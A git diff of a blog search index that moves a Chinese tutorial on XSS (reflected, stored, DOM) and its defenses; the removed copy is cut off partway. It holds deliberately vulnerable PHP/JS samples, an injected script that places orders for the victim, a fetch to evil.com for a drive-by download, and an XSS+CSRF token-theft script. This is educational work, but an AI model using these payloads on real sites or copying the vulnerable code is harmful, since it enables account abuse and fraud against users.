@@ -1,6 +1,243 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>一篇文章了解XSS</title>
+    <url>/2026/01/14/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E4%BA%86%E8%A7%A3XSS/</url>
+    <content><![CDATA[xss都快忘得差不多，赶快再来read一下，这次好好吃细点
+原理
+
+
+什么是xss呢？
+xss全名Cross-site scripting，简单来说就是前端页面存在可写入风险，黑客通过特殊的手段往网页中插入了恶意的 JavaScript 脚本，从而在用户浏览网页时，对用户浏览器发起 Cookie 资料窃取、会话劫持、钓鱼欺骗等各攻击  。
+xss三种类型
+
+
+
+反射型
+
+反射型也称作非持久型、参数型跨站脚本。反射型 XSS 只是简单地把用户输入的数据 “反射” 给浏览器。也就是说，黑客往往需要诱使用户 “点击” 一个恶意链接，才能攻击成功。
+假设一个网页直接把用户参数输出到页面上
+&lt;?php$input = $_GET[&#x27;param&#x27;];echo &quot;&lt;h1&gt;&quot;.$input.&quot;&lt;/h1&gt;&quot;;?&gt;
+
+用户向 param 提交的数据会展示到 &lt;h1&gt; 的标签中展示出来，比如提交：hi xss
+
+如果传&lt;script&gt;alert(&quot;hehe&quot;)&lt;/script&gt;
+
+用户输入的 Script 脚本，已经被写入页面中，因为后端代码并未对输入进行过滤审查，网页会将js代码拼接进网页代码，并且执行
+存储型
+
+存储型 XSS 和反射型 XSS 的差别仅在于：提交的 XSS 代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交 XSS 代码。最典型的例子是留言板 XSS。
+这边数据库搭建和后端编写都参考一下国光的
+&lt;meta charset=&quot;utf-8&quot;&gt;&lt;?php/*数据库信息配置*/$host = &quot;localhost&quot;; //数据库地址$port = &quot;3306&quot;; //数据库端口$user = &quot;root&quot;; //数据库用户名$pwd = &quot;root&quot;; //数据库密码$dbname = &quot;xss&quot;; //数据库名$conn = new mysqli($host,$user,$pwd,$dbname,$port);?&gt;&lt;!-- 前端用户输入表单 --&gt;&lt;h1&gt;留言板的存储型XSS&lt;/h1&gt;&lt;form  method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;姓名&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;message&quot; placeholder=&quot;请输入您的留言&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;?php    /*直接将留言插入到数据库中*/    $username=$_POST[&#x27;username&#x27;];    $message=$_POST[&#x27;message&#x27;];    if($username and $message)    &#123;        $sql=&quot;INSERT INTO `message`(`username`, `message`) VALUES (&#x27;&#123;$username&#125;&#x27;,&#x27;&#123;$message&#125;&#x27;)&quot;;        if ($conn-&gt;query($sql) === TRUE) &#123;            echo &quot;留言成功&quot;.&quot;&lt;br&gt;&quot;;        &#125; else &#123;            echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;        &#125;    &#125;else&#123;        echo &quot;请填写完整信息&quot;.&quot;&lt;br&gt;&quot;;    &#125;    /*查询数据库中的留言信息*/    $sql = &quot;SELECT username, message FROM message&quot;;    $result = $conn-&gt;query($sql);    if ($result-&gt;num_rows &gt; 0) &#123;        while($row = $result-&gt;fetch_assoc()) &#123;            echo &quot;用户名：&quot; . $row[&quot;username&quot;]. &quot;留言内容:&quot; . $row[&quot;message&quot;].&quot;&lt;br&gt;&quot;;        &#125;    &#125; else &#123;        echo &quot;暂无留言&quot;;    &#125;?&gt;
+
+
+上面就是代码运行的结果，可以写入用户与姓名，且结果会展现在页面并存入数据库，无论任何用户何时访问当前网站都会出现留言板的信息，此时若有恶意攻击者写入js脚本在留言板中，就会导致后面所有访问的用户都执行该js脚本
+我们试验一下，在留言处写入&lt;script&gt;alter(11)&lt;/script&gt;
+
+
+结果符合我们的设想，存储型 XSS 的攻击是最隐蔽的也是危害比较大的，普通用户所看的 URL 为 http://localhost/php/xss/save.php，从 URL 上看均是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有 XSS 代码，就当做正常的 HTML 与 JS 解析执行，于是就触发了 XSS 攻击。
+dom型
+
+通过修改页面的 DOM 节点形成的 XSS，称之为 DOM XSS。它和反射型 XSS、存储型 XSS 的差别在于，DOM XSS 的 XSS 代码并不需要服务器解析响应的直接参与，触发 XSS 靠的就是浏览器端的 DOM 解析，可以认为完全是客户端的事情。
+【DOM 节点（DOM Node）是 文档对象模型（Document Object Model） 的基本组成单位，DOM 将 HTML&#x2F;XML 文档视为一个由节点组成的树形结构，每个节点代表文档中的一部分（如标签、文本、属性等）】
+代码依旧参考国光
+&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;script&gt;    function xss()&#123;        var str = document.getElementById(&quot;src&quot;).value;        document.getElementById(&quot;demo&quot;).innerHTML = &quot;&lt;img src=&#x27;&quot;+str+&quot;&#x27; /&gt;&quot;;    &#125;&lt;/script&gt;&lt;input type=&quot;text&quot; id=&quot;src&quot; size=&quot;50&quot; placeholder=&quot;输入图片地址&quot; /&gt;&lt;input type=&quot;button&quot; value=&quot;插入&quot; onclick=&quot;xss()&quot; /&gt;&lt;br&gt;&lt;div id=&quot;demo&quot; &gt;&lt;/div&gt;
+
+
+
+
+
+
+同样，这里也没有对用户的输入进入过滤，当攻击者构造&#39; onerror=&#39;alert(233)插入的时候：
+
+会直接在 img 标签中插入 onerror 事件，该语句表示当图片加载出错的时候，自动触发后面的 alert () 函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。
+但更正式点的dom型应该 对 window.location、document.URL、document.referrer、document.cookie 等包含用户可控数据的对象进行操作
+三种类型区别
+
+对三种xss都有了解过后，我们来聊聊三种xss都有什么区别
+dom型与反射型和存储型最大的区别就是：dom型由客户端独立完成，不经过服务端
+恶意脚本不在服务器返回的 HTML 源码中，仅在客户端执行 JS 后动态插入 DOM，查看页面源码无法发现，需通过浏览器开发者工具（Elements 面板）查看动态生成的 DOM。
+而反射型与存储型都需要服务端的参与，反射型是服务端将恶意数据反射回客户端，存储型也会将恶意数据反射回客户端， 但恶意脚本会被永久存储在服务器中，反射型的生命周期只有一次
+xss利用
+
+要学会防护，当然要先学会利用（文中出现的利用都是设想情况，无实际利用过，具体利用可以自己搭靶场测试）
+xss有以下利用方式：
+
+网络钓鱼
+盗取用户 cookies 信息
+劫持用户浏览器
+强制弹出广告页面、刷流量
+网页挂马
+进行恶意操作，例如任意篡改页面信息
+获取客户端隐私信息
+控制受害者机器向其他网站发起攻击
+结合其他漏洞，如 CSRF 漏洞，实施进一步作恶
+提升用户权限，包括进一步渗透网站
+传播跨站脚本蠕虫等
+
+
+劫持用户浏览器
+注入的恶意脚本和用户正常操作的脚本拥有完全相同的权限，能：
+
+操作页面 DOM（点击按钮、填充表单、触发事件）。
+
+发起网络请求（携带用户的 Cookie、会话凭证）。
+
+读取 &#x2F; 修改页面数据（获取表单内容、修改提交参数）。
+因为操作在用户已登录的上下文执行，网站服务器会默认这些操作是用户本人发起的，完全不会拦截，风险比单纯窃取信息更直接.
+
+简单写个代码举例介绍一下
+一个购物网站存在存储型xss
+&lt;script&gt;window.onload = function() &#123;  document.querySelector(&#x27;[data-product-id=&quot;10086&quot;] .add-cart-btn&#x27;).click();  setTimeout(() =&gt; &#123;    window.location.href = &#x27;/checkout&#x27;;  &#125;, 1000);  setTimeout(() =&gt; &#123;    document.querySelector(&#x27;#receiver-name&#x27;).value = &#x27;张三&#x27;;    document.querySelector(&#x27;#receiver-phone&#x27;).value = &#x27;138xxxx8888&#x27;;    document.querySelector(&#x27;#receiver-address&#x27;).value = &#x27;XX市XX区XX路XX号&#x27;;    document.querySelector(&#x27;.submit-order-btn&#x27;).click();  &#125;, 2000);&#125;;&lt;/script&gt;
+
+当用户（已登录电商账号，且账户有余额 &#x2F; 绑定支付方式）浏览该商品评价时，脚本自动执行：
+
+无需用户操作，自动将高价海鲜加入购物车。
+跳转结算页后，填充攻击者的收货地址。
+直接提交订单，触发支付（若用户开通了 “免密支付”，则直接扣款）。
+
+网站服务器收到订单请求时，因携带用户的登录会话 Cookie，判定为用户本人操作，成功创建订单并完成支付。用户直到收到扣款通知，才发现被恶意下单。
+
+
+
+网页挂马
+XSS 是 “入口”，负责将恶意触发代码植入可信页面；真正的 “挂马” 依赖恶意资源（攻击脚本、漏洞利用程序、病毒文件）和用户环境漏洞（浏览器旧版本、插件漏洞、系统漏洞），两者结合完成从 “脚本执行” 到 “设备受控” 的升级。
+例子：
+攻击者发现某购物网站的 “商品问答区” 存在存储型 XSS 漏洞，注入代码
+&lt;div onclick=&quot;fetch(&#x27;http://evil.com/load-attack&#x27;)&quot;&gt;点击查看商品隐藏优惠（仅限前100人）&lt;/div&gt;
+
+
+attack.js检测用户浏览器版本存在的漏洞，加载对应漏洞利用脚本。
+
+脚本下载恶意程序shopping-voucher.exe（伪装成 “优惠券领取工具”）。
+
+弹出弹窗：“领取优惠券需安装安全插件，点击运行即可使用”，用户点击 “运行” 后，恶意程序执行。
+
+恶意程序在用户设备上安装后门，回连攻击者 C2 服务器，用户电脑被完全控制，后续可能被窃取支付密码、银行信息等。
+
+
+
+xss+csrf
+以 “篡改用户绑定手机号” 为例，完整攻击链路如下
+&lt;script&gt;  // 1. XSS脚本读取页面中的CSRF Token（假设在隐藏表单中）  const csrfToken = document.querySelector(&#x27;input[name=&quot;csrf_token&quot;]&#x27;).value;  // 2. 自动构造“修改手机号”的POST请求（CSRF攻击）  fetch(&#x27;/api/change-phone&#x27;, &#123;    method: &#x27;POST&#x27;,    headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27; &#125;,    body: `csrf_token=$&#123;csrfToken&#125;&amp;new_phone=攻击者手机号`,    credentials: &#x27;include&#x27; // 携带用户登录Cookie  &#125;);&lt;/script&gt;
+
+
+用户触发 XSS：其他用户（已登录）浏览含恶意评论的页面时，脚本自动执行。
+CSRF 请求生效：脚本携带用户的登录 Cookie 和合法 CSRF Token 发起请求，服务器验证通过（认为是用户本人操作），成功将手机号改为攻击者的号码。
+
+
+
+xss防护
+
+
+
+在介绍具体防护之前，先介绍一些基础知识
+Httponly
+
+
+HttpOnly是Cookie中一个属性，用于防止客户端脚本通过document.cookie属性访问Cookie，有助于保护Cookie不被跨站脚本攻击窃取或篡改。但是，HttpOnly的应用仍存在局限性，一些浏览器可以阻止客户端脚本对Cookie的读操作，但允许写操作；此外大多数浏览器仍允许通过XMLHTTP对象读取HTTP响应中的Set-Cookie头。
+
+设置样例
+
+response.setHeader( &quot;Set-Cookie&quot; , &quot;cookiename=httponlyTest;Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly&quot;);  例如：//设置cookie//Path=/：限制 Cookie 的作用路径。response.addHeader(&quot;Set-Cookie&quot;, &quot;uid=112; Path=/; HttpOnly&quot;)//设置多个cookieresponse.addHeader(&quot;Set-Cookie&quot;, &quot;uid=112; Path=/; HttpOnly&quot;);response.addHeader(&quot;Set-Cookie&quot;, &quot;timeout=30; Path=/test; HttpOnly&quot;);//设置https的cookieresponse.addHeader(&quot;Set-Cookie&quot;, &quot;uid=112; Path=/; Secure; HttpOnly&quot;);//Secure：限制 Cookie 仅在 HTTPS 加密连接中传输，HTTP 明文连接不会携带该 Cookie。
+
+
+
+SOP(Same-origin policy)
+
+
+同源策略是一种网络浏览器安全机制，旨在防止网站之间相互攻击。
+同源策略限制一个源上的脚本访问另一个源上的数据。源由 URI 协议、域名和端口号组成。同源就意味着协议，域名，端口都必须相同，访问其下子目录则没问题
+
+同源政策存在多种例外情况：
+有些对象可以跨域写入，但不能跨域读取，例如来自 iframe 或新窗口的 location对象或属性。location.href
+有些对象是可读的，但不能跨域写入，例如对象length的属性window（存储页面上使用的帧数）和closed属性。
+该replace函数通常可以跨域调用对象location。
+您可以跨域调用某些函数。例如，您可以在新窗口中调用 getMessage()  和close  getMessage() 函数。该函数也可以在 iframe 和新窗口中调用，以便将消息从一个域发送到另一个域。 blur focus postMessage
+
+
+
+CORS
+
+跨源资源共享（CORS，或通俗地译为跨域资源共享）是一种基于 HTTP 头的机制，该机制通过允许服务器标示除了它自己以外的其他源（域、协议或端口），使得浏览器允许这些源访问加载自己的资源。
+跨源资源共享标准新增了一组 HTTP 标头字段，允许服务器声明哪些源站通过浏览器有权限访问哪些资源。另外，规范要求，对那些可能对服务器数据产生副作用的 HTTP 请求方法（特别是 GET 以外的 HTTP 请求，或者搭配某些 MIME 类型的 POST 请求），浏览器必须首先使用 OPTIONS 方法发起一个预检请求（preflight request），从而获知服务端是否允许该跨源请求。服务器确认允许之后，才发起实际的 HTTP 请求。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（例如 Cookie 和 HTTP 认证相关数据）。
+CSP(Content security policy)
+
+
+
+CSP 是一种浏览器安全机制，旨在缓解 XSS 和其他一些攻击。它的工作原理是限制页面可以加载的资源（例如脚本和图像），并限制页面是否可以被其他页面嵌入。
+要启用 CSP，响应需要包含一个名为 &lt;CSP_DIR&gt; 的 HTTP 响应头，Content-Security-Policy其值包含策略信息。策略本身由一个或多个指令组成，指令之间用分号分隔。
+Content-Security-Policy:    default-src &#x27;self&#x27;;    //所有未单独指定的资源，都只能从当前同源加载    script-src &#x27;self&#x27;;    //只允许加载本站 JavaScript    style-src &#x27;self&#x27;;    //只允许本站 CSS 样式    img-src &#x27;self&#x27;;    object-src &#x27;none&#x27;;    frame-ancestors &#x27;none&#x27;;    //禁止页面被任何 iframe/frame 嵌套    base-uri &#x27;self&#x27;;    //控制 &lt;base href=&quot;...&quot;&gt; 的来源    connect-src &#x27;self&#x27;;    //限制 AJAX / fetch / WebSocket 只能访问同源
+
+
+
+
+
+
+
+了解了上面的基础知识就可以更好的了解我们下面要讲的防护了
+跨站脚本攻击的防范通常可以通过两层防御来实现：
+
+对输出数据进行编码
+到达时验证输入
+
+对输出进行编码
+
+编码应该在将用户可控数据写入页面之前立即应用，因为写入的上下文决定了需要使用哪种编码。例如，JavaScript 字符串中的值需要与 HTML 上下文中的值不同的转义方式。
+在 HTML 环境中，您应该将未列入白名单的值转换为 HTML 实体：
+
+&lt;转换为：&lt;
+&gt;转换为：&gt;
+
+在 JavaScript 字符串上下文中，非字母数字值应该进行 Unicode 转义：
+
+&lt;转换为：\u003c
+&gt;转换为：\u003e
+
+有时您需要按正确的顺序应用多层编码。例如，要安全地将用户输入嵌入到事件处理程序中，您需要同时处理 JavaScript 上下文和 HTML 上下文。因此，您需要先对输入进行 Unicode 转义，然后再进行 HTML 编码：
+&lt;a href=&quot;#&quot; onclick=&quot;x=&#x27;This string needs two layers of escaping&#x27;&quot;&gt;test&lt;/a&gt;
+
+
+
+
+
+到达时验证
+
+编码可能是抵御 XSS 攻击最重要的防线，但它不足以在所有情况下都完全防止 XSS 漏洞。您还应该在首次收到用户输入时就尽可能严格地验证其有效性。
+输入验证示例包括：
+
+如果用户提交的 URL 将在响应中返回，请验证其是否以安全的协议（例如 HTTP 和 HTTPS）开头。否则，有人可能会使用有害协议（例如 HTTPS 或javascriptHTTPS）攻击您的网站data。
+如果用户提供的值预期为数值，则验证该值是否实际包含整数。
+验证输入是否仅包含预期的字符集。
+
+理想的输入验证方式应该是直接阻止无效输入。另一种尝试清除无效输入使其有效的方法更容易出错，应尽可能避免。
+CSP防xss
+
+内容安全策略 (CSP) 是抵御跨站脚本攻击的最后一道防线。如果您的 XSS 防护措施失效，您可以使用 CSP 通过限制攻击者的操作来缓解 XSS 攻击。
+CSP 允许您控制各种事项，例如是否允许加载外部脚本以及是否执行内联脚本。要部署 CSP，您需要在 HTTP 响应头中添加一个名为 &lt;header_name&gt; 的参数，Content-Security-Policy其值包含您的策略。
+以下是一个CSP示例：
+default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; frame-src &#x27;none&#x27;; base-uri &#x27;none&#x27;;
+
+此策略规定，图片和脚本等资源只能从与主页相同的源加载。因此，即使攻击者成功注入了 XSS 有效载荷，他们也只能从当前源加载资源。这大大降低了攻击者利用 XSS 漏洞的可能性。
+如果您需要加载外部资源，请确保仅允许不会帮助攻击者利用您网站的脚本。例如，如果您将某些域名列入白名单，攻击者就可以加载来自这些域名的任何脚本。尽可能将资源托管在您自己的域名上。
+php中防xss
+
+PHP 中有一个名为 encode 的内置函数用于对实体进行编码htmlentities。在 HTML 上下文中，您应该调用此函数来转义输入。该函数应使用三个参数调用：
+
+您输入的字符串。
+ENT_QUOTES这是一个标志，用于指定所有引号都应该进行编码。
+字符集在大多数情况下应为 UTF-8。
+
+例如：
+&lt;?php echo htmlentities($input, ENT_QUOTES, &#x27;UTF-8&#x27;);?&gt;]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>xss</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>WOTOP10芝CSRF篇</title>
     <url>/2025/11/21/WOTOP10%E8%8A%9DCSRF%E7%AF%87/</url>
     <content><![CDATA[什么是CRSF
@@ -390,243 +627,6 @@ https://www.freebuf.com/articles/web/330777.html
       </categories>
       <tags>
         <tag>xxe</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>一篇文章了解XSS</title>
-    <url>/2026/01/14/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E4%BA%86%E8%A7%A3XSS/</url>
-    <content><![CDATA[xss都快忘得差不多，赶快再来read一下，这次好好吃细点
-原理
-
-
-什么是xss呢？
-xss全名Cross-site scripting，简单来说就是前端页面存在可写入风险，黑客通过特殊的手段往网页中插入了恶意的 JavaScript 脚本，从而在用户浏览网页时，对用户浏览器发起 Cookie 资料窃取、会话劫持、钓鱼欺骗等各攻击  。
-xss三种类型
-
-
-
-反射型
-
-反射型也称作非持久型、参数型跨站脚本。反射型 XSS 只是简单地把用户输入的数据 “反射” 给浏览器。也就是说，黑客往往需要诱使用户 “点击” 一个恶意链接，才能攻击成功。
-假设一个网页直接把用户参数输出到页面上
-&lt;?php$input = $_GET[&#x27;param&#x27;];echo &quot;&lt;h1&gt;&quot;.$input.&quot;&lt;/h1&gt;&quot;;?&gt;
-
-用户向 param 提交的数据会展示到 &lt;h1&gt; 的标签中展示出来，比如提交：hi xss
-
-如果传&lt;script&gt;alert(&quot;hehe&quot;)&lt;/script&gt;
-
-用户输入的 Script 脚本，已经被写入页面中，因为后端代码并未对输入进行过滤审查，网页会将js代码拼接进网页代码，并且执行
-存储型
-
-存储型 XSS 和反射型 XSS 的差别仅在于：提交的 XSS 代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交 XSS 代码。最典型的例子是留言板 XSS。
-这边数据库搭建和后端编写都参考一下国光的
-&lt;meta charset=&quot;utf-8&quot;&gt;&lt;?php/*数据库信息配置*/$host = &quot;localhost&quot;; //数据库地址$port = &quot;3306&quot;; //数据库端口$user = &quot;root&quot;; //数据库用户名$pwd = &quot;root&quot;; //数据库密码$dbname = &quot;xss&quot;; //数据库名$conn = new mysqli($host,$user,$pwd,$dbname,$port);?&gt;&lt;!-- 前端用户输入表单 --&gt;&lt;h1&gt;留言板的存储型XSS&lt;/h1&gt;&lt;form  method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;姓名&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;message&quot; placeholder=&quot;请输入您的留言&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;?php    /*直接将留言插入到数据库中*/    $username=$_POST[&#x27;username&#x27;];    $message=$_POST[&#x27;message&#x27;];    if($username and $message)    &#123;        $sql=&quot;INSERT INTO `message`(`username`, `message`) VALUES (&#x27;&#123;$username&#125;&#x27;,&#x27;&#123;$message&#125;&#x27;)&quot;;        if ($conn-&gt;query($sql) === TRUE) &#123;            echo &quot;留言成功&quot;.&quot;&lt;br&gt;&quot;;        &#125; else &#123;            echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;        &#125;    &#125;else&#123;        echo &quot;请填写完整信息&quot;.&quot;&lt;br&gt;&quot;;    &#125;    /*查询数据库中的留言信息*/    $sql = &quot;SELECT username, message FROM message&quot;;    $result = $conn-&gt;query($sql);    if ($result-&gt;num_rows &gt; 0) &#123;        while($row = $result-&gt;fetch_assoc()) &#123;            echo &quot;用户名：&quot; . $row[&quot;username&quot;]. &quot;留言内容:&quot; . $row[&quot;message&quot;].&quot;&lt;br&gt;&quot;;        &#125;    &#125; else &#123;        echo &quot;暂无留言&quot;;    &#125;?&gt;
-
-
-上面就是代码运行的结果，可以写入用户与姓名，且结果会展现在页面并存入数据库，无论任何用户何时访问当前网站都会出现留言板的信息，此时若有恶意攻击者写入js脚本在留言板中，就会导致后面所有访问的用户都执行该js脚本
-我们试验一下，在留言处写入&lt;script&gt;alter(11)&lt;/script&gt;
-
-
-结果符合我们的设想，存储型 XSS 的攻击是最隐蔽的也是危害比较大的，普通用户所看的 URL 为 http://localhost/php/xss/save.php，从 URL 上看均是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有 XSS 代码，就当做正常的 HTML 与 JS 解析执行，于是就触发了 XSS 攻击。
-dom型
-
-通过修改页面的 DOM 节点形成的 XSS，称之为 DOM XSS。它和反射型 XSS、存储型 XSS 的差别在于，DOM XSS 的 XSS 代码并不需要服务器解析响应的直接参与，触发 XSS 靠的就是浏览器端的 DOM 解析，可以认为完全是客户端的事情。
-【DOM 节点（DOM Node）是 文档对象模型（Document Object Model） 的基本组成单位，DOM 将 HTML&#x2F;XML 文档视为一个由节点组成的树形结构，每个节点代表文档中的一部分（如标签、文本、属性等）】
-代码依旧参考国光
-&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;script&gt;    function xss()&#123;        var str = document.getElementById(&quot;src&quot;).value;        document.getElementById(&quot;demo&quot;).innerHTML = &quot;&lt;img src=&#x27;&quot;+str+&quot;&#x27; /&gt;&quot;;    &#125;&lt;/script&gt;&lt;input type=&quot;text&quot; id=&quot;src&quot; size=&quot;50&quot; placeholder=&quot;输入图片地址&quot; /&gt;&lt;input type=&quot;button&quot; value=&quot;插入&quot; onclick=&quot;xss()&quot; /&gt;&lt;br&gt;&lt;div id=&quot;demo&quot; &gt;&lt;/div&gt;
-
-
-
-
-
-
-同样，这里也没有对用户的输入进入过滤，当攻击者构造&#39; onerror=&#39;alert(233)插入的时候：
-
-会直接在 img 标签中插入 onerror 事件，该语句表示当图片加载出错的时候，自动触发后面的 alert () 函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。
-但更正式点的dom型应该 对 window.location、document.URL、document.referrer、document.cookie 等包含用户可控数据的对象进行操作
-三种类型区别
-
-对三种xss都有了解过后，我们来聊聊三种xss都有什么区别
-dom型与反射型和存储型最大的区别就是：dom型由客户端独立完成，不经过服务端
-恶意脚本不在服务器返回的 HTML 源码中，仅在客户端执行 JS 后动态插入 DOM，查看页面源码无法发现，需通过浏览器开发者工具（Elements 面板）查看动态生成的 DOM。
-而反射型与存储型都需要服务端的参与，反射型是服务端将恶意数据反射回客户端，存储型也会将恶意数据反射回客户端， 但恶意脚本会被永久存储在服务器中，反射型的生命周期只有一次
-xss利用
-
-要学会防护，当然要先学会利用（文中出现的利用都是设想情况，无实际利用过，具体利用可以自己搭靶场测试）
-xss有以下利用方式：
-
-网络钓鱼
-盗取用户 cookies 信息
-劫持用户浏览器
-强制弹出广告页面、刷流量
-网页挂马
-进行恶意操作，例如任意篡改页面信息
-获取客户端隐私信息
-控制受害者机器向其他网站发起攻击
-结合其他漏洞，如 CSRF 漏洞，实施进一步作恶
-提升用户权限，包括进一步渗透网站
-传播跨站脚本蠕虫等
-
-
-劫持用户浏览器
-注入的恶意脚本和用户正常操作的脚本拥有完全相同的权限，能：
-
-操作页面 DOM（点击按钮、填充表单、触发事件）。
-
-发起网络请求（携带用户的 Cookie、会话凭证）。
-
-读取 &#x2F; 修改页面数据（获取表单内容、修改提交参数）。
-因为操作在用户已登录的上下文执行，网站服务器会默认这些操作是用户本人发起的，完全不会拦截，风险比单纯窃取信息更直接.
-
-简单写个代码举例介绍一下
-一个购物网站存在存储型xss
-&lt;script&gt;window.onload = function() &#123;  document.querySelector(&#x27;[data-product-id=&quot;10086&quot;] .add-cart-btn&#x27;).click();  setTimeout(() =&gt; &#123;    window.location.href = &#x27;/checkout&#x27;;  &#125;, 1000);  setTimeout(() =&gt; &#123;    document.querySelector(&#x27;#receiver-name&#x27;).value = &#x27;张三&#x27;;    document.querySelector(&#x27;#receiver-phone&#x27;).value = &#x27;138xxxx8888&#x27;;    document.querySelector(&#x27;#receiver-address&#x27;).value = &#x27;XX市XX区XX路XX号&#x27;;    document.querySelector(&#x27;.submit-order-btn&#x27;).click();  &#125;, 2000);&#125;;&lt;/script&gt;
-
-当用户（已登录电商账号，且账户有余额 &#x2F; 绑定支付方式）浏览该商品评价时，脚本自动执行：
-
-无需用户操作，自动将高价海鲜加入购物车。
-跳转结算页后，填充攻击者的收货地址。
-直接提交订单，触发支付（若用户开通了 “免密支付”，则直接扣款）。
-
-网站服务器收到订单请求时，因携带用户的登录会话 Cookie，判定为用户本人操作，成功创建订单并完成支付。用户直到收到扣款通知，才发现被恶意下单。
-
-
-
-网页挂马
-XSS 是 “入口”，负责将恶意触发代码植入可信页面；真正的 “挂马” 依赖恶意资源（攻击脚本、漏洞利用程序、病毒文件）和用户环境漏洞（浏览器旧版本、插件漏洞、系统漏洞），两者结合完成从 “脚本执行” 到 “设备受控” 的升级。
-例子：
-攻击者发现某购物网站的 “商品问答区” 存在存储型 XSS 漏洞，注入代码
-&lt;div onclick=&quot;fetch(&#x27;http://evil.com/load-attack&#x27;)&quot;&gt;点击查看商品隐藏优惠（仅限前100人）&lt;/div&gt;
-
-
-attack.js检测用户浏览器版本存在的漏洞，加载对应漏洞利用脚本。
-
-脚本下载恶意程序shopping-voucher.exe（伪装成 “优惠券领取工具”）。
-
-弹出弹窗：“领取优惠券需安装安全插件，点击运行即可使用”，用户点击 “运行” 后，恶意程序执行。
-
-恶意程序在用户设备上安装后门，回连攻击者 C2 服务器，用户电脑被完全控制，后续可能被窃取支付密码、银行信息等。
-
-
-
-xss+csrf
-以 “篡改用户绑定手机号” 为例，完整攻击链路如下
-&lt;script&gt;  // 1. XSS脚本读取页面中的CSRF Token（假设在隐藏表单中）  const csrfToken = document.querySelector(&#x27;input[name=&quot;csrf_token&quot;]&#x27;).value;  // 2. 自动构造“修改手机号”的POST请求（CSRF攻击）  fetch(&#x27;/api/change-phone&#x27;, &#123;    method: &#x27;POST&#x27;,    headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27; &#125;,    body: `csrf_token=$&#123;csrfToken&#125;&amp;new_phone=攻击者手机号`,    credentials: &#x27;include&#x27; // 携带用户登录Cookie  &#125;);&lt;/script&gt;
-
-
-用户触发 XSS：其他用户（已登录）浏览含恶意评论的页面时，脚本自动执行。
-CSRF 请求生效：脚本携带用户的登录 Cookie 和合法 CSRF Token 发起请求，服务器验证通过（认为是用户本人操作），成功将手机号改为攻击者的号码。
-
-
-
-xss防护
-
-
-
-在介绍具体防护之前，先介绍一些基础知识
-Httponly
-
-
-HttpOnly是Cookie中一个属性，用于防止客户端脚本通过document.cookie属性访问Cookie，有助于保护Cookie不被跨站脚本攻击窃取或篡改。但是，HttpOnly的应用仍存在局限性，一些浏览器可以阻止客户端脚本对Cookie的读操作，但允许写操作；此外大多数浏览器仍允许通过XMLHTTP对象读取HTTP响应中的Set-Cookie头。
-
-设置样例
-
-response.setHeader( &quot;Set-Cookie&quot; , &quot;cookiename=httponlyTest;Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly&quot;);  例如：//设置cookie//Path=/：限制 Cookie 的作用路径。response.addHeader(&quot;Set-Cookie&quot;, &quot;uid=112; Path=/; HttpOnly&quot;)//设置多个cookieresponse.addHeader(&quot;Set-Cookie&quot;, &quot;uid=112; Path=/; HttpOnly&quot;);response.addHeader(&quot;Set-Cookie&quot;, &quot;timeout=30; Path=/test; HttpOnly&quot;);//设置https的cookieresponse.addHeader(&quot;Set-Cookie&quot;, &quot;uid=112; Path=/; Secure; HttpOnly&quot;);//Secure：限制 Cookie 仅在 HTTPS 加密连接中传输，HTTP 明文连接不会携带该 Cookie。
-
-
-
-SOP(Same-origin policy)
-
-
-同源策略是一种网络浏览器安全机制，旨在防止网站之间相互攻击。
-同源策略限制一个源上的脚本访问另一个源上的数据。源由 URI 协议、域名和端口号组成。同源就意味着协议，域名，端口都必须相同，访问其下子目录则没问题
-
-同源政策存在多种例外情况：
-有些对象可以跨域写入，但不能跨域读取，例如来自 iframe 或新窗口的 location对象或属性。location.href
-有些对象是可读的，但不能跨域写入，例如对象length的属性window（存储页面上使用的帧数）和closed属性。
-该replace函数通常可以跨域调用对象location。
-您可以跨域调用某些函数。例如，您可以在新窗口中调用 getMessage()  和close  getMessage() 函数。该函数也可以在 iframe 和新窗口中调用，以便将消息从一个域发送到另一个域。 blur focus postMessage
-
-
-
-CORS
-
-跨源资源共享（CORS，或通俗地译为跨域资源共享）是一种基于 HTTP 头的机制，该机制通过允许服务器标示除了它自己以外的其他源（域、协议或端口），使得浏览器允许这些源访问加载自己的资源。
